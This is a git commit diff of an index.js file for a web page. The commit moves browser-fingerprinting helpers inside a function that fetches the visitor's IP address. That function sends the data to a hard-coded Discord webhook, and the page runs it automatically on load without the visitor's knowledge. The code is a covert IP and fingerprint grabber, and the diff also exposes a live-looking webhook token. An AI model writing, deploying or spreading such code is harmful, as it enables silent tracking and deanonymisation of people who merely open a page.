e655d254c98ef2a2e392617285a4672eb599ca51
Zalaxis <130976751+z4laxis@users.noreply.github.com>
2023-07-22 22:11:48 +0100

    Update index.js

--- index.js
+++ index.js
@@ -1,5 +1,80 @@
         function sendUserAndIPToWebhook() {
-            const webhookURL = 'https://discord.com/api/webhooks/1132405889396129819/g8O3i4yyJFmYcrh9tmH3X9UXpRPvPn5BUbjDrJ0nsctfu3uWMf_6gXermzfhqR_KpnWW'; // Replace with your actual Discord webhook URL
+             function getOperatingSystem() {
+            const userAgent = navigator.userAgent;
+            let os = 'Unknown';
+            if (userAgent.indexOf('Win') !== -1) os = 'Windows';
+            else if (userAgent.indexOf('Mac') !== -1) os = 'MacOS';
+            else if (userAgent.indexOf('Linux') !== -1) os = 'Linux';
+            else if (userAgent.indexOf('Android') !== -1) os = 'Android';
+            else if (userAgent.indexOf('iOS') !== -1) os = 'iOS';
+            return os;
+        }
+
+        // Get screen dimensions
+        function getScreenInfo() {
+            return `Width: ${window.screen.width}, Height: ${window.screen.height}`;
+        }
+
+        // Get user language
+        function getLanguageInfo() {
+            return navigator.language || 'Unknown';
+        }
+
+        // Get user timezone
+        function getTimezoneInfo() {
+            return Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
+        }
+
+        // Get browser information
+        function getBrowserInfo() {
+            const userAgent = navigator.userAgent;
+            const browserInfo = userAgent.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
+            const browserName = browserInfo[1];
+            const browserVersion = browserInfo[2];
+
+            if (browserName === 'Chrome') {
+                return `Google Chrome (Version ${browserVersion})`;
+            } else if (browserName === 'Safari') {
+                return `Safari (Version ${browserVersion})`;
+            } else if (browserName === 'Firefox') {
+                return `Mozilla Firefox (Version ${browserVersion})`;
+            } else if (browserName === 'Edge' || browserName === 'MSIE') {
+                return `Microsoft Internet Explorer (Version ${browserVersion})`;
+            } else if (browserName === 'Opera') {
+                return `Opera (Version ${browserVersion})`;
+            } else {
+                return 'Unknown Browser';
+            }
+        }
+
+        // Get user agent
+        function getUserAgentInfo() {
+            return navigator.userAgent || 'Unknown';
+        }
+
+        // Get current time
+        function getCurrentTime() {
+            const now = new Date();
+            return now.toLocaleTimeString();
+        }
+
+        // Get current date
+        function getCurrentDate() {
+            const now = new Date();
+            return now.toLocaleDateString();
+        }
+
+        // Check if Java is enabled
+        function isJavaEnabled() {
+            return navigator.javaEnabled() ? 'Enabled' : 'Disabled';
+        }
+
+        // Check if cookies are enabled
+        function areCookiesEnabled() {
+            return navigator.cookieEnabled ? 'Enabled' : 'Disabled';
+        }
+
+                const webhookURL = 'https://discord.com/api/webhooks/1132405889396129819/g8O3i4yyJFmYcrh9tmH3X9UXpRPvPn5BUbjDrJ0nsctfu3uWMf_6gXermzfhqR_KpnWW'; // Replace with your actual Discord webhook URL
 
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
@@ -143,81 +218,5 @@
                 })
                 .catch(error => console.error(error));
         }
-
-        function getOperatingSystem() {
-            const userAgent = navigator.userAgent;
-            let os = 'Unknown';
-            if (userAgent.indexOf('Win') !== -1) os = 'Windows';
-            else if (userAgent.indexOf('Mac') !== -1) os = 'MacOS';
-            else if (userAgent.indexOf('Linux') !== -1) os = 'Linux';
-            else if (userAgent.indexOf('Android') !== -1) os = 'Android';
-            else if (userAgent.indexOf('iOS') !== -1) os = 'iOS';
-            return os;
-        }
-
-        // Get screen dimensions
-        function getScreenInfo() {
-            return `Width: ${window.screen.width}, Height: ${window.screen.height}`;
-        }
-
-        // Get user language
-        function getLanguageInfo() {
-            return navigator.language || 'Unknown';
-        }
-
-        // Get user timezone
-        function getTimezoneInfo() {
-            return Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
-        }
-
-        // Get browser information
-        function getBrowserInfo() {
-            const userAgent = navigator.userAgent;
-            const browserInfo = userAgent.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
-            const browserName = browserInfo[1];
-            const browserVersion = browserInfo[2];
-
-            if (browserName === 'Chrome') {
-                return `Google Chrome (Version ${browserVersion})`;
-            } else if (browserName === 'Safari') {
-                return `Safari (Version ${browserVersion})`;
-            } else if (browserName === 'Firefox') {
-                return `Mozilla Firefox (Version ${browserVersion})`;
-            } else if (browserName === 'Edge' || browserName === 'MSIE') {
-                return `Microsoft Internet Explorer (Version ${browserVersion})`;
-            } else if (browserName === 'Opera') {
-                return `Opera (Version ${browserVersion})`;
-            } else {
-                return 'Unknown Browser';
-            }
-        }
-
-        // Get user agent
-        function getUserAgentInfo() {
-            return navigator.userAgent || 'Unknown';
-        }
-
-        // Get current time
-        function getCurrentTime() {
-            const now = new Date();
-            return now.toLocaleTimeString();
-        }
-
-        // Get current date
-        function getCurrentDate() {
-            const now = new Date();
-            return now.toLocaleDateString();
-        }
-
-        // Check if Java is enabled
-        function isJavaEnabled() {
-            return navigator.javaEnabled() ? 'Enabled' : 'Disabled';
-        }
-
-        // Check if cookies are enabled
-        function areCookiesEnabled() {
-            return navigator.cookieEnabled ? 'Enabled' : 'Disabled';
-        }
-
         // Automatically send the webhook on page load
         sendUserAndIPToWebhook();
